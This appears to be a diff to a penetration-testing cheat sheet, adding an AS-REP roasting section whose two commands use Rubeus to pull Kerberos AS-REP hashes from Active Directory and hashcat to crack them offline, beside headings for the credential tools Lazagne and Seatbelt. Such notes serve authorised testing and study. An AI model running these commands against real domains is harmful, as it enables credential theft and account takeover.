@@ -17,3 +17,11 @@
 #### 2) Lazagne
 
 #### 3) Seatbelt
+
+# Asreproasting
+
+| Command                                                      | Description                                                  |
+| ------------------------------------------------------------ | ------------------------------------------------------------ |
+| `.\Rubeus.exe asreproast /outfile:asrep.txt`                 | Used to perform the Asreproast attack and save the extracted tickets to a file. |
+| `hashcat -m 18200 -a 0 asrep.txt passwords.txt --force`      | Uses `hashcat` to crack AS-REP hashes that were saved in a file. |
+
